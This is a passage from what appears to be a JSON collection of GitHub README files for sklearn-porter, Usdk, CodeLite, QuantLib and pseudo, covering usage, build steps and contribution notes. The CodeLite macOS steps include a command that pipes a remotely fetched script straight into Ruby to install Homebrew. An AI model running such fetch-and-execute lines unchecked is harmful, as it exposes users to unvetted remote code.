branch](https:\/\/img.shields.io\/travis\/nok\/sklearn-porter\/master.svg)](https:\/\/travis-ci.org\/nok\/sklearn-porter)\n\nIf you want the [latest changes](https:\/\/github.com\/nok\/sklearn-porter\/blob\/master\/changelog.md#unreleased), you can install this package from the [master](https:\/\/github.com\/nok\/sklearn-porter\/tree\/master) branch:\n\n```bash\n$ pip uninstall -y sklearn-porter\n$ pip install --no-cache-dir https:\/\/github.com\/nok\/sklearn-porter\/zipball\/master\n```\n\n\n## Usage\n\n\n### Export\n\nThe following example demonstrates how you can transpile a [decision tree estimator](http:\/\/scikit-learn.org\/stable\/modules\/tree.html#classification) to Java:\n\n```python\nfrom sklearn.datasets import load_iris\nfrom sklearn.tree import tree\nfrom sklearn_porter import Porter\n\n# Load data and train the classifier:\nsamples = load_iris()\nX, y = samples.data, samples.target\nclf = tree.DecisionTreeClassifier()\nclf.fit(X, y)\n\n# Export:\nporter = Porter(clf, language='java')\noutput = porter.export(embed_data=True)\nprint(output)\n```\n\nThe exported [result](examples\/estimator\/classifier\/DecisionTreeClassifier\/java\/basics_embedded.pct.py#L60-L110) matches the [official human-readable version](http:\/\/scikit-learn.org\/stable\/_images\/iris.svg) of the decision tree.\n\n\n### Integrity\n\nYou should always check and compute the integrity between the original and the transpiled estimator:\n\n```python\n# ...\nporter = Porter(clf, language='java')\n\n# Compute integrity score:\nintegrity = porter.integrity_score(X)\nprint(integrity)  # 1.0\n```\n\n\n### Prediction\n\nYou can compute the prediction(s) in the target programming language:\n\n```python\n# ...\nporter = Porter(clf, language='java')\n\n# Prediction(s):\nY_java = porter.predict(X)\ny_java = porter.predict(X[0])\ny_java = porter.predict([1., 2., 3., 4.])\n```\n\n\n## Notebooks\n\nYou can run and test all notebooks by starting a Jupyter notebook server locally:\n\n```bash\n$ make open.examples\n$ make stop.examples\n```\n\n\n## CLI\n\nIn general you can use the porter on the command line:\n\n```\n$ porter <pickle_file> [--to <directory>]\n         [--class_name <class_name>] [--method_name <method_name>]\n         [--export] [--checksum] [--data] [--pipe]\n         [--c] [--java] [--js] [--go] [--php] [--ruby]\n         [--version] [--help]\n```\n\nThe following example shows how you can save a trained estimator to the [pickle format](http:\/\/scikit-learn.org\/stable\/modules\/model_persistence.html#persistence-example):\n\n```python\n# ...\n\n# Extract estimator:\njoblib.dump(clf, 'estimator.pkl', compress=0)\n```\n\nAfter that the estimator can be transpiled to JavaScript by using the following command:\n\n```bash\n$ porter estimator.pkl --js\n```\n\nThe target programming language is changeable on the fly:\n\n```bash\n$ porter estimator.pkl --c\n$ porter estimator.pkl --java\n$ porter estimator.pkl --php\n$ porter estimator.pkl --java\n$ porter estimator.pkl --ruby\n```\n\nFor further processing the argument `--pipe` can be used to pass the result:\n\n```bash\n$ porter estimator.pkl --js --pipe > estimator.js\n```\n\nFor instance the result can be minified by using [UglifyJS](https:\/\/github.com\/mishoo\/UglifyJS2):\n\n```bash\n$ porter estimator.pkl --js --pipe | uglifyjs --compress -o estimator.min.js\n```\n\n\n## Development\n\n\n### Environment\n\nYou have to install required modules for broader development:\n\n```bash\n$ make install.environment  # conda environment (optional)\n$ make install.requirements.development  # pip requirements\n```\n\nIndependently, the following compilers and intepreters are required to cover all tests:\n\n<table>\n    <thead>\n        <tr>\n            <td width=\"33%\"><strong>Name<\/strong><\/td>\n            <td width=\"33%\"><strong>Version<\/strong><\/td>\n            <td width=\"33%\"><strong>Command<\/strong><\/td>\n        <\/tr>\n    <\/thead>\n    <tbody>\n        <tr>\n            <td><a href=\"https:\/\/gcc.gnu.org\">GCC<\/a><\/td>\n            <td><code>>=4.2<\/code><\/td>\n            <td><code>gcc --version<\/code><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"https:\/\/java.com\">Java<\/a><\/td>\n            <td><code>>=1.6<\/code><\/td>\n            <td><code>java -version<\/code><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"http:\/\/www.php.net\">PHP<\/a><\/td>\n            <td><code>>=5.6<\/code><\/td>\n            <td><code>php --version<\/code><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"https:\/\/www.ruby-lang.org\">Ruby<\/a><\/td>\n            <td><code>>=2.4.1<\/code><\/td>\n            <td><code>ruby --version<\/code><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"https:\/\/golang.org\">Go<\/a><\/td>\n            <td><code>>=1.7.4<\/code><\/td>\n            <td><code>go version<\/code><\/td>\n        <\/tr>\n        <tr>\n            <td><a href=\"https:\/\/nodejs.org\">Node.js<\/a><\/td>\n            <td><code>>=6<\/code><\/td>\n            <td><code>node --version<\/code><\/td>\n        <\/tr>\n    <\/tbody>\n<\/table>\n\n\n### Testing\n\nThe tests cover module functions as well as matching predictions of transpiled estimators. Start all tests with:\n\n```bash\n$ make test\n```\n\nThe test files have a specific pattern: `'[Algorithm][Language]Test.py'`:\n\n```bash\n$ pytest tests -v -o python_files='RandomForest*Test.py'\n$ pytest tests -v -o python_files='*JavaTest.py'\n```\n\nWhile you are developing new features or fixes, you can reduce the test duration by changing the number of tests:\n\n```bash\n$ N_RANDOM_FEATURE_SETS=5 N_EXISTING_FEATURE_SETS=10 \\\n  pytest tests -v -o python_files='*JavaTest.py'\n```\n\n\n### Quality\n\nIt's highly recommended to ensure the code quality. For that [Pylint](https:\/\/github.com\/PyCQA\/pylint\/) is used. Start the linter with:\n\n```bash\n$ make lint\n```\n\n\n## Citation\n\nIf you use this implementation in you work, please add a reference\/citation to the paper. You can use the following BibTeX entry:\n\n```\n@unpublished{skpodamo,\n  author = {Darius Morawiec},\n  title = {sklearn-porter},\n  note = {Transpile trained scikit-learn estimators to C, Java, JavaScript and others},\n  url = {https:\/\/github.com\/nok\/sklearn-porter}\n}\n```\n\n\n## License\n\nThe module is Open Source Software released under the [MIT](license.txt) license.\n\n\n## Questions?\n\nDon't be shy and feel free to contact me on [Twitter](https:\/\/twitter.com\/darius_morawiec) or [Gitter](https:\/\/gitter.im\/nok\/sklearn-porter).\n"},{"repo":"\/honghuachen\/Usdk","language":"HTML","readme_contents":"# Usdk \n\u8fd9\u662f\u4e00\u4e2aUnity3D\u79fb\u52a8\u5e73\u53f0sdk\u5feb\u901f\u9002\u914d\u6846\u67b6\u548c\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\uff0c\u65b9\u4fbfandroid\u3001ios\u79fb\u52a8\u5e73\u53f0\u6e20\u9053sdk\u6216\u8005\u5404\u79cdNative\u529f\u80fd\u63d2\u4ef6\u7684\u5feb\u901f\u63a5\u5165\uff0c\u63a5\u5165\u8fc7\u7a0b\u65e0\u9700\u4fee\u6539\u6dfb\u52a0\u4efb\u4f55\u7684C#\u4ee3\u7801\u3002\u5185\u7f6e\u7684\u6253\u5305\u5de5\u5177\uff0c\u80fd\u591f\u5728\u4e0d\u4fee\u6539\u4efb\u4f55unity\u5de5\u7a0b\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u5feb\u901f\u7684\u5355\u6e20\u9053\u548c\u591a\u6e20\u9053\u6253\u5305\u3002sdk\u9002\u914d\u65f6\u95f4\u548c\u6e20\u9053\u6253\u5305\u65f6\u95f4\u81f3\u5c11\u53ef\u4ee5\u51cf\u5c11\u4e00\u534a\u4ee5\u4e0a\u3002\n\n# \u76ee\u5f55\u7ed3\u6784\n[usdk\u76ee\u5f55\u7ed3\u6784\u4e0e\u76ee\u5f55\u8bf4\u660e\uff08xmind\u601d\u7ef4\u5bfc\u56fe\uff09](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Usdk%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.xmind)\n![image](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Usdk%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%AF%B4%E6%98%8E.png)\n\n# \u6587\u6863\n[Android\u5f00\u53d1\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Android%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3.docx)  \n[iOS\u5f00\u53d1\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/iOS%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3.docx)  \n[Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx)  \n[\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx)  \n[Unity\u7aefAPI\u4f7f\u7528](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Unity%E7%AB%AFAPI%E4%BD%BF%E7%94%A8.doc)  \n\n# \u7cfb\u7edf\u8981\u6c42\n#android\uff1a\n#Java JDK1.7\u62161.8\uff0candroid sdk8.0\u4ee5\u4e0a\uff08\u81f3\u5c11\u5347\u5230\u4e8627\uff09\n\n# Unity3D\u7248\u672c\u652f\u6301\nUnity\u5168\u7248\u672c\u652f\u6301\n\n# \u591a\u5e73\u53f0\u652f\u6301\n\u76ee\u524d\u652f\u6301android\u3001ios\nandroid\u5e73\u53f0\u652f\u6301eclipse\u3001android studio\u5de5\u7a0b\u9002\u914d\nios\u652f\u6301xcode\u5de5\u7a0b\u9002\u914d\n\n# \u5feb\u901f\u9002\u914d\u6e20\u9053sdk\u548cNative\u63d2\u4ef6\nUsdk\u80fd\u591f\u5feb\u901f\u7684\u9002\u914d\u5404\u4e2a\u6e20\u9053sdk\u548cNative\u63d2\u4ef6\uff0c\u9002\u914d\u8fc7\u7a0b\u65e0\u9700\u4fee\u6539\u548c\u6dfb\u52a0\u4efb\u4f55C#\u4ee3\u7801\uff0c\u505a\u5230C#\u4ee3\u7801\u7684\u96f6\u5165\u4fb5\u3002\nUsdk\u53ef\u4ee5\u505a\u5230\u6309\u9700\u8c03\u7528\u5404\u79cdNative\u63d2\u4ef6\uff0c\u5404\u79cdNative\u63d2\u4ef6\u53ef\u4ee5\u6309\u9700\u6253\u5165\u5404\u4e2a\u6e20\u9053\u5305\uff0c\u5254\u9664\u65e0\u7528\u7684Native\u63d2\u4ef6\uff0c\u4ece\u800c\u8282\u7701\u5305\u4f53\u3002\n\n# \u652f\u6301\u9879\u76ee\u4f9d\u8d56\nandroid\uff1aandroid\u5e73\u53f0\u901a\u8fc7gradle\u6253\u5305\uff0c\u6240\u4ee5\u5929\u7136\u7684\u5c31\u652f\u6301\u9879\u76ee\u4f9d\u8d56\u3002\u53ea\u9700\u8981\u628a\u4f9d\u8d56\u9879\u76ee\u505a\u6210\u4e00\u4e2amodule\u653e\u5230\u6e20\u9053libs\u6587\u4ef6\u5939\u4e0b\uff0c\u5728settings.gradle\u4e2d\u914d\u7f6emodule\u7684\u4f9d\u8d56\u8def\u5f84\uff0c\u518d\u5728build.gradle\u7684dependencies\u8282\u70b9\u4e0b\u4f9d\u8d56\u76f8\u5e94\u7684module\u5373\u53ef\u3002\niOS\uff1a\u53ef\u4ee5\u901a\u8fc7Framework\u3001cocoaPods\u3001workspace\u7684\u65b9\u5f0f\u5efa\u7acb\u79c1\u6709\u5e93\u7684\u4f9d\u8d56\u3002\n\n# \u5f3a\u5927\u7684\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\nUsdk\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2asdk\u9002\u914d\u6846\u67b6\uff0c\u66f4\u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u591a\u6e20\u9053\u6253\u5305\u5e73\u53f0\uff0c\u901a\u8fc7\u5f3a\u5927\u7684sdk\u9002\u914d\u673a\u5236\u80fd\u591f\u5feb\u901f\u7684\u5b9e\u73b0\u5355\u6e20\u9053\u548c\u591a\u6e20\u9053\u7684\u51fa\u5305\uff0c\u5e76\u4e14\u53ef\u4ee5\u5927\u5927\u7684\u51cf\u5c11\u51fa\u5305\u65f6\u95f4\u3002\n\n# jenkins\u8fdc\u7a0b\u6784\u5efa\u652f\u6301\nUsdk\u5b9e\u73b0\u4e86\u672c\u5730\u547d\u4ee4\u884c\u6253\u5305\u5de5\u5177\uff08build.bat\\build.sh\uff09\uff0c\u4f7f\u7528jenkins\u8fdc\u7a0b\u6784\u5efa\u53ea\u9700\u8981\u628a\u672c\u5730\u7684\u547d\u4ee4\u884c\u5de5\u5177\u7a0d\u4f5c\u4fee\u6539\uff0c\u628a\u672c\u5730\u8f93\u5165\u53c2\u6570\u64cd\u4f5c\u53bb\u6389\u5e76\u5728jenkins\u5e73\u53f0\u4e0a\u8fdb\u884c\u53c2\u6570\u8bbe\u7f6e\u518d\u8c03\u7528\u672c\u5730\u547d\u4ee4\u884c\u5de5\u5177\u6253\u5305\u5373\u53ef\u3002\n\n# Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177([\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx))\n[Unity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/Unity%E5%AF%BC%E5%87%BAxcode%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7.docx)  \n\u5728unity4.x\u901a\u8fc7xupoter\u63d2\u4ef6\u6765\u8bbe\u7f6eunity\u5bfc\u51faxcode\u81ea\u52a8\u914d\u7f6e\uff0c\u5230\u4e86unity5.x unity\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u5957\u5de5\u5177\uff0c\u5e76\u4e14\u6bd4xupoter\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u64cd\u4f5c\u53ef\u80fd\u3002\u4f46\u662funity\u7684\u5de5\u5177\u96c6\u6210\u5728\u4e86unity\u7f16\u8f91\u5668\u91cc\u9762\uff0c\u6240\u4ee5\u5982\u679c\u8981\u60f3\u4f7f\u7528\u53ea\u80fd\u5728unity\u5de5\u7a0b\u4e2d\u901a\u8fc7\u7f16\u8f91\u5668\u529f\u80fd\u6765\u64cd\u4f5c\u5bfc\u51faxcode\u5de5\u7a0b\u7684\u81ea\u52a8\u914d\u7f6e\u3002\u8fd9\u6837\u6709\u4e00\u4e2a\u7f3a\u70b9\u5c31\u662f\u5bf9\u4e8eunity\u5de5\u7a0b\u4e0d\u9700\u8981\u53d8\u5316\u4f46\u662f\u53c8\u8981\u6253\u591a\u4e2a\u6e20\u9053\u7684iOS\u5305\u7684\u60c5\u51b5\u4e0b\u9700\u8981\u6bcf\u6b21\u90fd\u8981\u91cd\u65b0\u4eceUnity\u5bfc\u51fa\u5230xcode\uff0c\u5bf9\u4e8e\u5927\u9879\u76ee\u8fd9\u662f\u5341\u5206\u6d6a\u8d39\u65f6\u95f4\u7684\u3002\u9488\u5bf9\u4e0a\u8ff0\u60c5\u51b5\uff0cUsdk\u72ec\u7acb\u51fa\u4e86unity\u8fd9\u5957\u81ea\u52a8\u914d\u7f6e\u5de5\u5177\uff0c\u5b8c\u5168\u8131\u79bb\u4e86Unity\u4f53\u7cfb\uff0c\u80fd\u591f\u5355\u72ec\u4f5c\u4e3a\u4e00\u4e2a\u5916\u90e8\u5de5\u5177\u968f\u65f6\u968f\u5730\u7684\u64cd\u4f5cxcode\u5de5\u7a0b\u4e0b\u7684\u5de5\u7a0b\u914d\u7f6e\u6587\u4ef6\u548cInfo.plist\u914d\u7f6e\u6587\u4ef6\uff0c\u53ef\u4ee5\u6dfb\u52a0\u6216\u8005\u79fb\u9664\u6307\u5b9a\u5e93\u3001\u6e90\u7801\u3001\u8d44\u6e90\u7b49\uff0c\u64cd\u4f5c\u975e\u5e38\u7075\u6d3b\uff0c\u53ea\u8981\u4f60\u80fd\u60f3\u5f97\u5230\u7684\u64cd\u4f5c\u90fd\u80fd\u591f\u5b9e\u73b0\u3002\n\u5e76\u4e14\u5de5\u5177\u901a\u8fc7unity\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684mono\u865a\u62df\u673a\u8fdb\u884c\u8fd0\u884c\uff0c\u6240\u4ee5\u5177\u6709\u8de8\u5e73\u53f0\u7684\u80fd\u529b\uff0c\u4e0d\u7ba1\u662fwindows\u8fd8\u662fmac\u90fd\u80fd\u591f\u4f7f\u7528\u3002\n\n# iOS\u6253\u5305\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa([\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx))\n[\u667a\u80fd\u652f\u6301CocoaPods\u9879\u76ee\u7684\u6784\u5efa\u6587\u6863](https:\/\/github.com\/honghuachen\/Usdk\/blob\/master\/doc\/CocoaPods%E6%9E%84%E5%BB%BA%E9%85%8D%E7%BD%AE.docx)  \nUsdk\u52a0\u5165\u4e86CocoaPods\u81ea\u52a8\u6784\u5efa\u5de5\u5177\uff0c\u4f7f\u5f97cocoapods\u65b9\u5f0f\u6784\u5efaxcode\u5de5\u7a0b\u6210\u4e3a\u53ef\u80fd\uff0c\u5185\u7f6e\u5de5\u5177\u53ef\u4ee5\u5b9e\u73b0Project\\Workspace xcode\u9879\u76ee\u7c7b\u578b\u7684\u6784\u5efa\u3002\niOS\u591a\u6e20\u9053\u591a\u63d2\u4ef6\u51fa\u5305\u4e0d\u4ec5\u652f\u6301\u672c\u5730Framework\u7684\u5bfc\u5165\uff0c\u8fd8\u667a\u80fd\u652f\u6301CocoaPods\u8fdc\u7a0b\u4ed3\u5e93\u4f9d\u8d56\u7684\u6784\u5efa\uff0c\u5e76\u4e14\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6df7\u7528\u3002\u53ea\u9700\u8981\u5728\u63d2\u4ef6\u6216\u8005\u6e20\u9053\u7684module\u6587\u4ef6\u5939\u4e0b\u52a0\u5165\u4e00\u4e2aCocoaPods.json\u7684\u4f9d\u8d56\u914d\u7f6e\u6587\u4ef6\u5373\u53ef\uff0c\u6253\u5305\u5de5\u5177\u5373\u4f1a\u667a\u80fd\u8bc6\u522b\u4f9d\u8d56\u5e76\u6784\u5efaCocoaPods\u9879\u76ee\u3002\n\n# \u6280\u672f\u652f\u6301\nQQ\u7fa4\uff1a[3112035](https:\/\/jq.qq.com\/?_wv=1027&k=5RKFifT)\n"},{"repo":"\/eranif\/codelite","language":"C++","readme_contents":"[![CircleCI](https:\/\/circleci.com\/gh\/eranif\/codelite.svg?style=svg)](https:\/\/circleci.com\/gh\/eranif\/codelite)\n[![Join the chat at https:\/\/gitter.im\/eranif\/codelite](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/eranif\/codelite?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n\nWhat is CodeLite?\n====\n\n[CodeLite][1] is a free, open source, cross platform IDE specialized in C, C++, PHP and JavaScript (mainly for backend developers using Node.js) programming languages, which runs best on all major platforms (Windows, macOS and Linux).\n\nYou can download pre-built binaries for Windows, macOS and Linux from our **[Download Page][2]**.\n\nMore information can be found here:\n\n - [Official Website][3]\n - [Download Page][4]\n - [Wiki][5]\n\n----------\n\nBuilding CodeLite on Linux\n----\n\nTo build CodeLite on your computer you will need these packages:\n\n - wxWidgets 3.1 or later\n - The GTK development package: often called libgtk2.0-dev or wxGTK-devel, or similar\n - pkg-config (which usually comes with the GTK dev package)\n - The build-essential package (or the relevant bit of it: G++, Make etc)\n - CMake\n - Git.\n\nYou should have wxWidgets 3.0 or later built on your machine. If you don't know how to build (or you're just lazy...) you can [download wxWidgets from CodeLite's repository][6].\n\n\nOn Ubuntu \/ Debian you can install all of the above (except for wxWidgets 3.0) by typing:\n\n    sudo apt-get install libgtk2.0-dev pkg-config build-essential git cmake libssh-dev libwxbase3.0-dev libsqlite3-dev libwxsqlite3-3.0-dev\n\nGit clone the sources:\n\n    git clone https:\/\/github.com\/eranif\/codelite.git\n\nRun CMake and build CodeLite:\n\n  ```bash\n  cd codelite\n  mkdir build-release\n  cd build-release\n  cmake .. -DCMAKE_BUILD_TYPE=Release\n  cmake --build . -j $(nproc)\n  sudo cmake --build . --target install\n  ```\n\n----------\n\nBuilding CodeLite on macOS\n----\n\nPrerequisites:\n\n - wxWidgets 3.1 or later\n - CMake\n - Git\n - Xcode\n - Xcode command-line tools\n - Homebrew.\n\nPreparation:\n - (Optional) Make a separate folder for building if you want to get rid of all except the .app file after building\n - Install Xcode from Mac App Store\n - Install Xcode command-line tools: `xcode-select --install`\n - Install Homebrew:\n```\n ruby -e \"$(curl -fsSL https:\/\/raw.githubusercontent.com\/Homebrew\/install\/master\/install)\"\n```\n - Update Homebrew: `brew update`\n - (Optional) Upgrade Homebrew packages: `brew upgrade`\n - Install Git: `brew install git`\n - Install CMake: `brew install cmake`\n - Install wxWidgets: `brew install wxmac --dev --use-llvm`\n\n\nClone the repo (lets assume that you have a folder `\/Users\/YOU\/src`)\n\n  ```bash\n  cd \/Users\/YOU\/src\n  git clone https:\/\/github.com\/eranif\/codelite.git\n  ```\n the above will create the folder `\/Users\/YOU\/codelite`\n\n To build CodeLite:\n\n  ```bash\n  cd \/Users\/YOU\/codelite\n  mkdir build-release\n  cd build-release\n  cmake .. -DCMAKE_BUILD_TYPE=Release\n  cmake --build . -j $(sysctl -n hw.physicalcpu)\n  cmake --build . --target install\n  ```\n\nYou should now have an app bundle `\/Users\/YOU\/codelite\/build-release\/codelite.app`\n\nTo launch CodeLite:\n\n`open \/Users\/YOU\/codelite\/build-release\/codelite.app`\n\n----------\n\nBuilding CodeLite on Windows\n----\n\nGit clone the sources:\n\n    git clone https:\/\/github.com\/eranif\/codelite.git\n\n - Download CodeLite installer for Windows from our [Download Page][8]\n - Build wxWidgets 3.1 or later. See build instructions [here][7]\n - Open the workspace **CodeLiteIDE.workspace** (located in the CodeLite's folder)\n - Make sure that the project **CodeLiteIDE** is selected (the active project uses **bold** font)\n - Select the **Win_x64_Release** or **Win_x86_Release** (depending if you want to build a 32 or 64 bit version of CodeLite) and hit **F7**\n - When the compilation is over, close the workspace\n - Next, locate the workspace **codelite_utils\/codelite_utils.workspce** and open it\n - Select the **Win_x64_Release** or **Win_x86_Release** (depending if you want to build a 32 or 64 bit version of CodeLite), hit **F7** and wait for the compilation to end\n - Close CodeLite\n - To update your installation with the new CodeLite, close CodeLite and from a cmd.exe window navigate to codelite-sources\/Runtime\/ and run the file **update64.bat** OR **update.bat** (again, depending on your selected arch).\n\n  [1]: https:\/\/codelite.org\n  [2]: https:\/\/codelite.org\/support.php\n  [3]: https:\/\/codelite.org\n  [4]: https:\/\/codelite.org\/support.php\n  [5]: https:\/\/wiki.codelite.org\/pmwiki.php\n  [6]: https:\/\/wiki.codelite.org\/pmwiki.php\/Main\/WxWidgets31Binaries\n  [7]: https:\/\/wiki.codelite.org\/pmwiki.php\/Developers\/BuildingWxWidgetsWin\n  [8]: https:\/\/codelite.org\/support.php\n"},{"repo":"\/lballabio\/QuantLib","language":"C++","readme_contents":"\n# QuantLib: the free\/open-source library for quantitative finance\n\n[![Download](https:\/\/api.bintray.com\/packages\/quantlib\/releases\/QuantLib\/images\/download.svg)](https:\/\/bintray.com\/quantlib\/releases\/QuantLib\/_latestVersion)\n[![Licensed under the BSD 3-Clause License](https:\/\/img.shields.io\/badge\/License-BSD--3--Clause-blue.svg)](https:\/\/github.com\/lballabio\/QuantLib\/blob\/master\/LICENSE.TXT)\n[![DOI](https:\/\/zenodo.org\/badge\/DOI\/10.5281\/zenodo.1440997.svg)](https:\/\/doi.org\/10.5281\/zenodo.1440997)\n[![PRs Welcome](https:\/\/img.shields.io\/badge\/PRs%20-welcome-brightgreen.svg)](#contributing)\n\n[![Build Status](https:\/\/travis-ci.org\/lballabio\/QuantLib.svg?branch=master)](https:\/\/travis-ci.org\/lballabio\/QuantLib)\n[![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/bmpiucu74eldfkm0\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/lballabio\/quantlib\/branch\/master)\n[![Codacy Badge](https:\/\/api.codacy.com\/project\/badge\/Grade\/b4bc1058db994f24aa931b119a885eea)](https:\/\/www.codacy.com\/app\/lballabio\/QuantLib)\n[![Code Quality: Cpp](https:\/\/img.shields.io\/lgtm\/grade\/cpp\/g\/lballabio\/QuantLib.svg?logo=lgtm&logoWidth=18)](https:\/\/lgtm.com\/projects\/g\/lballabio\/QuantLib\/context:cpp)\n[![codecov](https:\/\/codecov.io\/gh\/lballabio\/QuantLib\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/lballabio\/QuantLib)\n\n---\n\nThe QuantLib project (<http:\/\/quantlib.org>) is aimed at providing a\ncomprehensive software framework for quantitative finance. QuantLib is\na free\/open-source library for modeling, trading, and risk management\nin real-life.\n\nQuantLib is Non-Copylefted Free Software and OSI Certified Open Source\nSoftware.\n\n\n## Download and usage\n\nQuantLib can be downloaded from <http:\/\/quantlib.org\/download.shtml>;\ninstallation instructions are available at\n<http:\/\/quantlib.org\/install.shtml> for most platforms.\n\nDocumentation for the usage and the design of the QuantLib library is\navailable from <http:\/\/quantlib.org\/docs.shtml>.\n\nA list of changes for each past versions of the library can be\nbrowsed at <http:\/\/quantlib.org\/reference\/history.html>.\n\n\n## Questions and feedback\n\nThe preferred channel for questions (and the one with the largest\naudience) is the quantlib-users mailing list.  Instructions for\nsubscribing are at <http:\/\/quantlib.org\/mailinglists.shtml>.\n\nBugs can be reported as a GitHub issue at\n<https:\/\/github.com\/lballabio\/QuantLib\/issues>; if you have a patch\navailable, you can open a pull request instead (see \"Contributing\"\nbelow).\n\n\n## Contributing\n\nThe preferred way to contribute is through pull requests on GitHub.\nGet a GitHub account if you don't have it already and clone the\nrepository at <https:\/\/github.com\/lballabio\/QuantLib> with the \"Fork\"\nbutton in the top right corner of the page. Check out your clone to\nyour machine, code away, push your changes to your clone and submit a\npull request; instructions are available at\n<https:\/\/help.github.com\/articles\/fork-a-repo>.\n\nIn case you need them, more detailed instructions for creating pull\nrequests are at\n<https:\/\/help.github.com\/articles\/using-pull-requests>, and a basic\nguide to GitHub is at\n<https:\/\/guides.github.com\/activities\/hello-world\/>.  GitHub also\nprovides interactive learning at <https:\/\/lab.github.com\/>.\n\nIt's likely that we won't merge your code right away, and we'll ask\nfor some changes instead. Don't be discouraged! That's normal; the\nlibrary is complex, and thus it might take some time to become\nfamiliar with it and to use it in an idiomatic way.\n\nWe're looking forward to your contributions.\n\n"},{"repo":"\/pseudo-lang\/pseudo","language":"Python","readme_contents":"[![Build Status](https:\/\/travis-ci.org\/alehander42\/pseudo.svg?branch=master)](https:\/\/travis-ci.org\/alehander42\/pseudo)\n[![codecov.io](https:\/\/codecov.io\/github\/alehander42\/pseudo\/coverage.svg?branch=master)](https:\/\/codecov.io\/github\/alehander42\/pseudo?branch=master)\n[![MIT License](http:\/\/img.shields.io\/badge\/License-MIT-blue.svg)](LICENSE)\n\n# pseudo\n\n[![Join the chat at https:\/\/gitter.im\/alehander42\/pseudo](https:\/\/badges.gitter.im\/alehander42\/pseudo.svg)](https:\/\/gitter.im\/alehander42\/pseudo?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\nPseudo takes an algorithm \/ a simple program and generates idiomatic code for it in Python, JavaScript, C#, Go and Ruby.\n\nPseudo achieves that with translation on two layers: it uses the target language syntax and it can express standard library methods\/api of language X using language Y's native standard library\n\nPseudo consumes \"Pseudo AST\" which corresponds to a very clear, statically typed and somehow limited subset of a language:\n\n  * basic types and collections and standard library methods for them\n  \n  * integer, float, string, boolean\n  * lists\n  * dicts\n  * sets\n  * tuples\/structs(fixed length heterogeneous lists)\n  * fixed size arrays\n  * regular expressions\n\n  * functions with normal parameters (no default\/keyword\/vararg parameters)\n  * classes \n    * single inheritance\n    * polymorphism\n    * no dynamic instance variables\n    * basically a constructor + a collection of instance methods, no fancy metaprogramming etc supported\n\n  * exception-based error handling with support for custom exceptions\n  (target languages support return-based error handling too)\n  \n  * I\/O: print\/input, file read\/write, command arg handling, system and subprocess commands\n\n  * iteration (for-in-range \/ for-each \/ iterating over several collections \/ while)\n  * conditionals (if \/ else if \/ else)\n  * standard math\/logical operations\n\n  * a lot more in future\n\n[standard library reference](docs\/library_reference.md)\n\n\nThose constructs and entities have almost the same behavior and very same-spirited api in a lot of the languages which Pseudo would support.\n\n## examples\n\nEach example contains a detailed README and working translations to Python, JS, Ruby, Go and C#, generated by Pseudo\n\n[fibonacci](examples\/fib)\n\n[a football results processing command line tool](examples\/football)\n\n[a verbal expressions-like library ported to all the target languages](examples\/verbal_expressions)\n\n### architecture\n\n```ruby\nPSEUDO AST:\n   NORMAL CODE     PSEUDO STANDARD LIBRARY INVOCATIONS     \n      ||                    ||\n      ||                    ||\n      ||              API TRANSLATOR\n      ||                    ||\n      ||                    ||\n      ||                    \\\/\n      ||              IDIOMATIC TARGET LANGUAGE \n      ||              STANDARD LIBRARY INVOCATIONS        \n      ||                    ||     \n      \\\/                    \\\/\n  STANDARD OR LANGUAGE-SPECIFIC MIDDLEWARES\n              e.g.\n    name camel_case\/snake_case 